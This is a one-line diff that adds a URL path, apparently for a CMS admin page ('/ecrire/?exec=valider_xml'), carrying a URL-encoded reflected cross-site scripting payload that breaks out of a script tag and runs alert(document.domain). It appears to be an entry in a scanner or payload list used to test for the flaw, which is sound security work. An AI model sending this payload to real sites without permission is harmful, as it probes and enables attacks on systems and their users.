@@ -1,0 +1,1 @@
+/ecrire/?exec=valider_xml&var_url=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
